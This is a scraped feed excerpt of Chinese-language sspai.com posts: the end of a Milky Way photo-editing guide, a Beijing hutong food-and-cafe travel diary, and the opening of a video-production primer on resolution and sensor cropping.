后期处理</h2>\n<p>网上看到让人心动的银河照片基本上都是经过了比较重的后期处理了的。由于画面风格是个人审美的事情，比较私人，在这里我只简单介绍我使用 Lightroom 处理银河照片的一些大体的处理思路。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520210.jpg\" alt=\"\"><figcaption>原始图片</figcaption></figure><h3><strong>Step 1：画面定调</strong></h3>\n<p>调整白平衡和曝光，把画面拉到一个色彩、曝光都基本符合自己想要的状态。一般而言，天空发蓝或者偏红是比较普遍会被接受的调整方向。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520223.jpg\" alt=\"\"></figure><h3><strong>Step 2：提亮天空</strong></h3>\n<p>毕竟地景和天空一般不能兼得，故使用「渐变滤镜」进行基本处理。一般可以略微提一下亮度，增加对比和饱和等等。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520237.jpg\" alt=\"\"></figure><h3><strong>Step 3：处理银心</strong></h3>\n<p>银河拍摄最夺人眼球的就是银心啦，这里使用「径向滤镜」将银心提亮并让颜色更鲜艳一些。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520254.jpg\" alt=\"\"></figure><h3><strong>Step 4：整体处理</strong></h3>\n<p>俗称加一些细节，把认为不好看或者影响观感的地方处理下。整个照片就完成啦~</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520268.jpg\" alt=\"_DSC2354-2\"><figcaption><strong>最终成片</strong></figcaption></figure><blockquote><p>修图的同时也需要注意一些自然常识，比如最终画面右上角的绿色，并不是局部偏色，实际上是一种自然现象「气辉」。</p></blockquote>\n<hr>\n<p>以上就是简单的银河拍摄指南，希望可以让对星空感兴趣的你走出家门，记录下美好的瞬间、并留下美好的故事。</p>\n<p>天文摄影是一个非常大的门类，再往后无论是深空摄影、还是星野摄影中去拍摄流星雨、拍摄极光，都需要你一步步对我们存在的宇宙深入的了解。希望这篇文章可以抛砖引玉，通过这样的方式告诉你，其实拍银河离我们并不遥远！其实<strong>只需要做好前期功课，就可以比较轻松的获得你想要的照片</strong>。</p>\n<p>我们在仰望星空、记录一个个夜空的同时，也记录着我们这个世界的环境变化，当然，也会让你更加热爱这个世界！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520283.jpg\" alt=\"merge01\"><figcaption>2021 年 7 月，摄于河北东甸子梁</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_cassiuschen/16257682520296.jpg\" alt=\"拱桥 test的副本\"><figcaption>2021 年 6 月，摄于河北五色天路</figcaption></figure>\n","link":"https://sspai.com/post/67622"},{"title":"快乐飞旅行报告 09：北京的胡同里有宝藏","date":"2021-07-10 03:13:26","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第九篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>这是我第二次来北京，上次是在 4 月，正值北京故宫花开得极好，可惜两天的时间仓促，没有好好逛。这回选在了端午节，时间是 6 月 12 日 - 6 月 14 日，用三天的时间再来北京好好逛逛胡同里的宝藏店铺。</p>\n<h2>修缮新开：妙应·白塔寺</h2>\n<p>北京的白塔有两座，一在北海，另一座是妙应寺。上回来北京，妙应寺在维护修缮。赶在端午节前一日，妙应寺终于修缮完成，重新开放。</p>\n<p>从北京大兴机场到达北京市区，时间也到了 13 点多。午餐就在妙应寺旁的「华天二友居肉饼」，里面靠窗的座位可以直接望见白塔。这是北京老牌连锁的餐饮店，招牌是「牛肉馅饼」，味道还行，牛肉香嫩、面皮干爽有嚼劲，不过重油，用荷叶莲子汤送食也能解腻。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/da135b225b8a5a37f68ce9ae8fe38cb5.jpg\"></figure><p>果腹之后直接前往百米开外的「莲咖啡」，这是挨着妙应寺开的咖啡店，在白塔之光民宿顶层，位于胡同尽头，因此也能算是胡同店铺。来这儿的唯一原因便是，直望妙应寺的露台风光。</p>\n<p>冰球咖啡，一颗深色咖啡冰球和一颗白色冰奶球，另一壶椰子水，将两球冲开，用肉桂棒搅拌，带上肉桂风味。味道还行，就着极佳的露台风光，喝个新鲜。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/9dc72b08b830987c4f682a6cada44660.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/b43e10588965d722b31d8d05a156ec47.jpg\" alt=\"\"></figure><h2>老北京芝麻酱咖啡：豆丁咖啡</h2>\n<p>豆丁咖啡，开在景山公园旁的沙滩后街，正经的老北京胡同里。2020年开业，来这儿是常驻北京的朋友兼向导推荐。抖音网红款「咸芝麻烧饼拿铁」，用了老北京芝麻酱稀释咖啡液，上层撒上椒盐，成了这款独具地方特色的拿铁。芝麻酱很难和咖啡完美融合，喝之前得充分搅拌。这拿铁喝起来就像吃完了火锅，剩着那点麻酱，兑了点汤喝的口感。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/546733ce1b6fec0ee3c5dd2dd2f20928.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/99381068470f9960f897284910fb1392.jpg\" alt=\"\"></figure><h2>北京小吃：护国寺小吃和尹三豆汁</h2>\n<p>北京小吃，著名的有炒肝、爆肚、豆汁。一晚一早，都选的是北京小吃。</p>\n<p>先是护国寺小吃，到店已经接近八点，很多小吃售罄，只挑些还在供应的品类。焦圈，就是炸面圈，尝起来像是已经把面圈的灵魂都炸散了，又焦又黑又硬。豌豆黄，是将豌豆磨碎制成糕点，就是豆沙糕的口感，清甜可口。野菜馅饼，野菜味很香，外皮薄脆。杏仁豆腐，杏仁味道确实非常浓郁，但是不得不说做成豆腐有种难以描述的气味。牛肉馅饼，简直就是牛肉月饼，上下两层面皮又厚且柴，像面包那样厚实，而不是肉夹馍的那种酥脆，内馅牛肉芹菜倒是真材实料，口味偏咸。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/c80f727663d27b641b9775b5ff4635f9.jpg\"></figure><p>早在之前看过 <a href=\"https://weibo.com/3645348205/Kh7dHcTCC\">@杨舒惠</a> 喝豆汁的视频，心里就寻思着豆汁到底什么味。终于在这天早上来到了「尹三豆汁」，这是北京豆汁界的名店，墙上写着「京城一绝」看来不俗。窗口排两队，一队是外带，一队是堂食，店里多是老北京，剩下的全是天南海北来的游客。</p>\n<p>正如 <a href=\"https://weibo.com/3645348205/Kh7dHcTCC\">@杨舒惠</a> 的评价那般，豆汁闻起来喝起来都像是刷锅水的味儿，小尝一口涩味很重，大尝一口舌根感受到浓厚的酸气，再入喉就是生豆味。面茶，就是咸面糊，上层铺一层二八酱，再撒些芝麻，口感偏咸。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/5911fc5cdbd6fd0b568a98d89e79f509.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/dbc1bf08057fdc82501aed55d4b0024e.jpg\" alt=\"\"></figure><h2>宫殿建筑：天坛公园</h2>\n<p>尹三豆汁就在天坛公园外，用完早点就可以进入天坛公园逛逛。天坛公园比北京故宫还要大上许多，这儿主要的景点是祈年殿。这是皇帝祭天祈雨祈谷的建筑，三层重檐圆形大殿，建在三层汉白玉圆台上，经常会被误认为是故宫里的建筑。</p>\n<p>时值端午节，尽管天气闷热阴沉，祈年殿里游客数量不少。天气预报有雨，但不过下了小小的一阵，于缓解闷热无益。在祈年殿前方的祁年门外，燕子也感受到这样难受的天气，一只只挨个绕梁低飞。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/9813595557d4fb145ac14433d650d2bc.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/bfdda5b4350ff5cddc1ffff57c095bd8.jpg\" alt=\"\"></figure><p> </p>\n<p>祈年门祈年殿里的正门，为庑殿顶建筑，殿宇五楹，中三间为门，崇基石栏，是中国古代最高等级门制。三门里正中间门正对祈年殿，这里有一个经典机位，正是从祈年门远望祈年殿，将门与殿一同拍下。可今日中间大门紧闭，只开左右两扇，无奈只能在中间门缝远窥祈年殿，抓拍燕子绕梁时的片刻掠影。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/9805422562683085e6ddf427c5aa12d2.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/787a3ad0bb48f2f5fc03e13720a7a81d.jpg\" alt=\"\"></figure><p>祈年门内的文创商店，贩卖祈年殿雪糕，这雪糕按祈年殿比例缩放，立体形状，来上一根正好与祈年殿合个影。</p>\n<h2>沃野 oii 餐厅：创意与口感绝佳</h2>\n<p>这次来北京，正式的胡同探店之旅，可以说是从永康胡同开始的。这里离去鼓楼不远，已经过了三两条平凡的胡同。</p>\n<p>沃野 oii 餐厅，开在永康胡同中间，店面藏在复古装潢的理发店里面，得穿过理发店进来。下午两点多了几乎没有什么客人，店内播放着日式小曲，光线昏暗只有一扇小窗望见胡同外的情形。</p>\n<p>这是一家主食餐厅，招牌「时蔬散寿司」。散就散在没有像传统寿司那样包裹成卷，而是寿司饭平铺在平底海碗里。寿司醋淡淡的酸味，底下一层薄薄的米饭，撒上了海苔碎条和黑芝麻。时令蔬菜是牛油果、秋葵、杏鲍菇、黄瓜丁、葫芦丁、薄荷叶等等，最上一层是红黄两层丝，红色是甜椒丝、黄色是鱿鱼丝。分量十足，一勺一勺慢慢吃竟也全吃光了。甜品「雪儿团子」，就是冷冻酸奶酪，内馅加了银耳碎，外层撒上椰蓉，甜度适中，清新可口。在甜点馅料里加入银耳碎，初次品尝，创意与口感都绝佳。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/908661644134962def05966f282df631.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/c2fe93bf20f72ca3c35135f484fd5115.jpg\" alt=\"\"></figure><h2>五道营胡同 vs 官书院胡同</h2>\n<p>下午的北京，日头无力地悬挂在天上，像是和积雨云争斗耗尽了所有力气。天气预报说有雷雨，但是迟迟不见雨的踪迹，气温却坚挺在36℃。</p>\n<p>先去官书院胡同，这里人烟稀少，闹中取静。呈 L 形走向，胡同两旁一侧是北京孔庙，红墙黑瓦，另一侧是居民楼，行人穿过，又是现代景象。再往里是国学胡同，内里极大，不过是一条真正意义上的死胡同，走不通。</p>\n<p>不远处的五道营胡同，人满为患。相较官书院胡同，五道营可谓是商业化完全渗透。不过这是高级的商业化，两侧的店铺，不乏西餐、酒吧、咖啡、文创，质感与设计都较国内其他旅游街区出色不少。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/71ee6530946ffe22821fd92f00eb09fa.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/07917941c23d4e2f788132e1e1e6dd2b.jpg\" alt=\"\"></figure><p>「入海口」，开在五道营胡同，是一家书店，也有咖啡和饮品供应。店内以海洋为主概念设计，色彩是令人感到深邃与沉静的克莱因蓝。书籍多是畅销书与艺术书籍，不过此时店内客人过多，空调无力，体验不好。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/3282bf11b08a84aa5058dac6edf74fd2.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/e298a32afa338be501c432aa17052cc5.jpg\" alt=\"\"></figure><h2>1/4 Coffee Lab</h2>\n<p>不如去喝杯咖啡。本是奔着「抬头见喜」去的东四，不料店里管道改造，正放假呢。于是只好选择就近的 One Quarter Coffee Lab，竟有意外收获。</p>\n<p>老北京 dirty，可以自选豆子，清爽口感是洪都拉斯豆，浓郁苦涩款是哥伦比亚豆。入口非常顺滑，用冰博克和冰杯，但是相比之前喝到的，牛奶似乎要少一些，因此甜味寡淡。递上 dirty 时，咖啡师会提醒你快速喝完。有意思是的，dirty 用了特殊的「不倒翁杯」。这种定制杯子在杯底有个小突起，放在桌上天然歪斜，不像底部平整的杯型。这样的设计也是希望让客人快速喝完 dirty。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/95bb6ef2c0dfa9959fed9e8554fa9ed0.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/dd40ccdcc6323e1ed9df60927dcc89f0.jpg\" alt=\"\"></figure><p>老北京 dirty，取名仅仅是因为店开在北京胡同里，也没了别的讲头。适逢节假日，店内异常忙碌，座无虚席。本想和咖啡师聊上几句，咖啡师却一直不得闲。</p>\n<h2>The Bulk House：零浪费无包装商店</h2>\n<p>南锣鼓巷一年四季人群攒动摩肩接踵，但隔街相望的北锣鼓巷，游客络绎不绝。不过在北锣鼓巷两侧，不乏咖啡、酒馆、宝藏店铺。</p>\n<p>The Bulk House：零浪费无包装商店，绿色的门头设在灰砖墙内，门外左右两棵树，颇为不俗。</p>\n<p>老板娘崇尚环保，店内售卖商品的材质、工艺，都是选了对环境伤害最小的来制作，有香薰、天然洗衣液、玻璃吸管、不绣钢餐具，棉质购物网带、竹纸、玉米可降解胶带等等等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/4d45fffd42d3951bf2afa917dab51c9f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/3d05ae436e0e5f921161a4e48ded8ed3.jpg\" alt=\"\"></figure><p>边逛商店边和老板娘聊聊环保理念。店内没有一切塑料制品以及可回收用品。据说原来回收用品在二次制作时也会产生污染以及塑料微粒，因此商店更爱选用不锈钢和玻璃。尽管不锈钢、玻璃在制作中仍然会产生污染，不过因为产品相对更加耐用，因此对环境相对有利。</p>\n<p>购买商品没有包装，通过网店发货的包装则是用纸，特别是在寄玻璃制品时，要用纸张一层一层包裹住，因此特别费时，成本也高。店里还有旧书免费拿，如果你真正有需要，就可以带走。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/b34ffbc519ac721f2a5f5b3476be88f1.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/fdbe08a92690598d3aa3927c37def357.jpg\" alt=\"\"></figure><h2>wake up&amp;coffee</h2>\n<p>终于下雨了，正如这位咖啡师所说，北京的雨不会下多久。实际确是一阵雨一阵晴，阳光与雨云一直在博弈，不相上下。下雨时哗啦啦大颗粒往下落，雨停时温和的阳光照耀胡同的灰瓦，东边乌云阴沉西边晚霞正好。</p>\n<p>这是开在 The Bulk House 对面的 wake up&amp;coffee，这是集咖啡、酒、艺术、设计于一体的小店。店内隔段时间就更新艺术家的作品，现在进行的是某位画家的展，店内粉刷的白墙上均挂上了这位画家的作品，有些标注了「已收藏」，说明这幅作品已经名花有主了。点单处可以制作手绘杯子，送给自闭症儿童，还有自制主题印章，盖章纪念。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/9490c4d444278d2de8b730a8672ce0ae.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/d1df05ba7aaa4efd38d78eadf781788f.jpg\" alt=\"\"></figure><p>饮品选了「妃子笑」，这是咖啡加酒的一款饮料，在荔枝风味的冷萃中加入自家酿的荔枝酒，以及广西黄糖。朗姆酒很少，只有一点点的涩味儿，咖啡的风味几不可闻，全被荔枝的甜味盖过了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/a65a929d2d7668a6945a923b93eea08f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/627530e29f55cb29aa6d6732964ae9fa.jpg\" alt=\"\"></figure><h2>四季民福：北京平民烤鸭店</h2>\n<p>据说北京的烤鸭店分三档，四季民福便是平民档，这不是贬低的意思，即使在最低档，口味和服务都不俗。适逢节假日，开在东四的四季民福，也要排队两小时，可见人气火爆。</p>\n<p>小吃拼盘，选了北京特色小吃里的糕点品类装盘，依次是豌豆黄、芸豆卷、驴打滚、艾窝窝和红豆凉糕，均是可口点心。芥末鸭掌，去骨鸭掌脆弹十足，黄瓜丝垫底，蘸满黄酱，另配芥末，让人胃口大开。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/a4d3f25fc6704d935f743b4ebdab748d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/77bd639e1c67a08b6f0991601de54742.jpg\" alt=\"\"></figure><p>再一道葱烧海参。海参鲜美如果冻般 Q 弹，胶质溢出，甜咸可口，洋葱、大葱经过油爆，香味渗透进米饭，再用海鲜的天然浓缩汤汁一拌，口感远超招牌烤鸭。烤鸭自不必说。先上鸭胸脯皮，蘸白糖，轻轻一嚼便油香四溢。烤鸭香嫩，鸭皮油、脂肪肥、鸭肉嫩，裹上面皮卷起配料蘸上甜面酱，十分可口。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/a018b3689ca27a2e49355b78f33bb4ba.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/cb3977b58d1ad7ace929ce419e5fa0f5.jpg\" alt=\"\"></figure><p>四季民福最出名的店，便是故宫旁的那家，这儿有一处景观位，可直望故宫，边吃烤鸭边望见高墙流水。不过可想而知，这景观位天天大排长队。四季民福服务意识很好，即使在排队时，也有饮用水、零食时时供应。作为平民烤鸭店，性价比也算高了。</p>\n<h2>il Gatto Coffee：有口皆碑的咖啡店</h2>\n<p>在北京的最后一杯咖啡，也算是开在胡同里。这里是圭亚那大使馆对面，附近的道路两旁皆是军事重地，大门紧闭，高墙森严。在居民区中间，突然出现一幢一层独栋建筑，门外铺满石子，大面积白墙只印了店名 il Gatto。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/73efc321569c2021a84c05ad32ddb4bd.jpg\"></figure><p>玻璃大门内别有洞天，水泥工业风装修，座位紧靠墙边，有些是连通墙壁的石凳，有些是亚克力桌椅。可能是靠近朝阳，店内来来往往皆是上班白领模样的客人，还不乏意大利客人。点餐区是小岛式吧台，内里两株琴叶榕长势极好。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/f82d1015240eaed46d207f3a640b0b42.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/4ac6b08d5301bd21d39c86dc4b2ad327.jpg\" alt=\"\"></figure><p>白夜，就是传统 dirty，特殊之处在于冰杯上方常温而下方经过冰块处理，触手冰凉。这样的处理能正好对应 dirty 上层热浓缩与下层冰博克牛奶。银魂 Gin，这是含酒精的咖啡饮料，加了份量不少的金酒、少许青柠汁以及杜松子，散发混合后的宜人香气。饮用前将咖啡液倒入杯中，又清又烈。因没有看过《银魂》，不能体会出这款饮品与取名的关联之处。另外店内还提供甜品，伯爵杏桃、提拉米苏都不错。</p>\n<h2>八条一号：京滇兼济</h2>\n<p>我们骑着电动车，从朝阳门一路骑到了西四，两边麻小、老北京林立，愣是没有找到想吃的东西。最后倒是小伙伴想起西四胡同里的一家店。这家店地址是西四北八条一号，于是取名店名便为「八条一号」。蔡澜题词，陈晓卿也在十年前推荐过这家店，说大厨兼主理人原是云南人，后来北京学厨，成了后自己开店。这便是「京滇兼济」的一家饭馆。</p>\n<p>精品肘子卷饼，便是地道的北京菜了。各色时蔬，有豆芽、青椒、萝卜条、黄瓜、鸡蛋条陈列一圈，中心香嫩猪肘。外装慢火烙熟的卷饼，外观金黄、表皮酥脆。由中间打开卷饼，塞进肘子和时蔬，加点笋丝、大葱，蘸上甜面酱。饼香肉香，再加时蔬爽脆，在北方「大饼卷万物」式菜肴里，这道肘子卷饼实属上乘。</p>\n<p>说到云南菜，大理炖牛肉得到陈晓卿的推荐，不过这次腹内饱饱，怕吃不完，于是选择了「小锅米线」。小锅现煮，酸菜咸汤，葱段肉末，仅是小锅也用料十足。米线偏硬口感有嚼劲，低汤尝着似乎有木姜子的加入，但店员说是云南酸腌菜，带有独特的香味与风味。另外点了时蔬「清炒丝瓜尖」，摘取丝瓜藤尖端较嫩的一段清炒而成，完全没有菜生味，看着干寡，实则汁水十足，颇为清爽，正适合与肘子卷饼一同食用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/c916adfb3908a0cd16199edf96cdd8e2.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/32e77f5596fdc28bdd6813c8163945a6.jpg\" alt=\"\"></figure><h2>大兴机场：原来是北京中轴</h2>\n<p>吃完「八条一号」便踏上了归程。上回来大兴机场，匆匆拍过几张图。这回时间充裕，绕着机场五层上上下下找机位。终于在五层有所收获，原来大兴机场是北京中轴线的延伸，在机场五层便是打卡点。正阳门、天安门、故宫、鼓楼均在中轴线上，现在一路延伸到了廊坊的大兴机场。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/5d1fb6c739a53199c0739e81d88e599e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/8a33408de4915d20880c949e0f97226a.jpg\" alt=\"\"></figure><h2>小结</h2>\n<p>隐藏玩法：在北京大兴机场的中国邮政，可以盖到大兴机场的邮戳，而且不需要购买邮票。北京大兴机场还有六枚纪念章，章面设计在线，十分好看。回到杭州萧山机场，可以在国内出发9号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/3b49fb2ea73ca9fc6c9ef7f8e046cd75.jpg\"></figure><p>出行费用：本次北京两日游共计花费 1697 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n<li><a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a></li>\n<li><a href=\"https://sspai.com/post/66745\" target=\"_blank\">快乐飞旅行报告 06：自驾在海南最美公路</a></li>\n<li><a href=\"https://sspai.com/post/67443\" target=\"_blank\">快乐飞旅行报告 07：郑州的胡辣汤辣口不辣心</a></li>\n<li><a href=\"https://sspai.com/post/67586\" target=\"_blank\">快乐飞旅行报告 08：汕头的牛肉能尝出甜味</a></li>\n</ul>\n","link":"https://sspai.com/post/67592"},{"title":"想做视频？这里有一份入门到进阶知识完整指南 ​","date":"2021-07-09 13:15:08","description":"\n<p>​【<b>万字长文，解释你在视频制作时会用到的知识和术语</b>，以及在器材选择时应该注意的问题，有点长，可以先收藏下来，慢慢看】 ​</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ebdde659e030c07c0e9ce3d56d38341a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"1042\" class=\"origin_image zh-lightbox-thumb\" width=\"852\" data-original=\"https://pic3.zhimg.com/v2-ebdde659e030c07c0e9ce3d56d38341a_r.jpg\"></figure><p>​</p>\n<p>不可置疑的是，这是一个视频的时代。 </p>\n<p>不论是相机还是手机厂商，每次发布会也会用很长的篇幅来解释他们产品的视频能力。 也很有多朋友为了更好的视频质量，不在满足于手机拍摄，开始选择单反或者微单开始自己视频的创作。 选购肯定也会遇到何种乱七八糟的参数，什么10bit ,什么422，super35，这是都是什么，又有什么作用？ 今天我们就来认真地讨论一下这些东西。</p>\n<p>​</p>\n<h2>4K即正义？分辨率</h2>\n<p>当你在B站看小姐姐跳舞的时候，有时候可能会看到这个标志【4k超清】。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e003ff23b00c7d5cd40f19fc5cc5888a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic3.zhimg.com/v2-e003ff23b00c7d5cd40f19fc5cc5888a_r.jpg\"></figure><p>这也许是大家最熟悉的一个的参数——分辨率，不论是视频也好，还是显示器或者电视机都会用到这个，很简单，也很容易理解，分辨率越高，视频画质越好。 ​</p>\n<p>通常上，还会用这样的一张图，来解释不同视频分辨率的效果。我们也会把这个分辨率称为『输出分辨率』。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f0d93cd8f4e5a062e1cf93c85bfec81d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-f0d93cd8f4e5a062e1cf93c85bfec81d_r.jpg\"></figure><p>有聪明的小朋友要问了，我的手机或者显示器不过是1080P的，那么还有必要搞4K么？ ​</p>\n<p>即使最终都是输出为1080P的，拍摄的素材为4K，会包含更多的色彩信息，感官上会感觉更加的清晰，色彩更加丰富（这个过程就是超采，下文会详细解释），而且也方便你进行画面的裁剪或者稳定。 ​</p>\n<p>拍摄8K同理，即使最终输出为4K的视频，也会获得更好的画面，但是问题就在于能够拍摄8K的设备普遍不便宜，对于存储和处理的要求会更高。除了相机之外，你还得更新电脑，买更贵的显卡和更大的硬盘才行。 ​</p>\n<p>所以目前来讲，<b>4k无疑更具有实用性</b>，而且几乎每一台手机，哪怕是入门级别的相机，也都开始普及4K视频了。 ​</p>\n<p>注： 4K分辨率其实是一个统称，画面横向像素在4000个左右，纵向在2000个像素左右的，都可以称之为4k分辨率，不同的设备和场景下，所以就有了不同的4k分辨率。 ​</p>\n<p>最为常见的，是我们日常的网络视频以及很多显示器的比例，16：9，分辨率为3840 × 2160，手机相机也通常也以这个分辨率捕获素材。 ​</p>\n<p>当然，还有其他规格的4k分辨率，可参考下表： </p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f9d5108e8fc41c56ec0fb4bc8e701097_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic4.zhimg.com/v2-f9d5108e8fc41c56ec0fb4bc8e701097_r.jpg\"></figure><p>部分相机也能拍摄DCI-4K的视频，比如松下的GH5s，S1H，以及万元最强全画幅视频微单S5。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1396591631634583552\"></a><p>​</p>\n<h2>为什么拍视频的时候，画面有变化？裁切与超采</h2>\n<p>现在请你拿出你的手机，从拍照模式切换到录像模式，你会发现一个有趣的现象，画面的视角好像发生了变化。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"481\" data-thumbnail=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"994\" data-original=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_r.jpg\"></figure><p>为什么呢？ ​</p>\n<p>其实很好理解，拍摄4K视频，分辨率为3840 × 2160，像素不过800万左右，但是问题现在手机像素通常都在1200万像素之上，相机呢，普遍的像素值在2000万左右。 ​</p>\n<p>那多出来的这些像素，怎么办？ ​</p>\n<p>第一种解法就是，多出来就多出来呗，不用就行，于是就有了裁切这种方式，拍摄视频的时候，我只使用中间那部分需要的像素就够了。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-42f413c6db1c21ff16988a6bafd8b865_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-42f413c6db1c21ff16988a6bafd8b865_r.jpg\"></figure><p> 缺点显而易见，就是本来能够拍摄的到视角变小了。 ​</p>\n<p>比如裁切系数为1.7倍，你使用一只24mm的广角镜头，拍摄出来的画面相当于40mm镜头拍的，丧失了广角端。 ​</p>\n<p>顺便也提醒大家一点，厂家往往很鸡贼，会把这个裁切系数用很小很小的字体写在备注里。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-56844b28915425c0986f0ee66889c5b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" 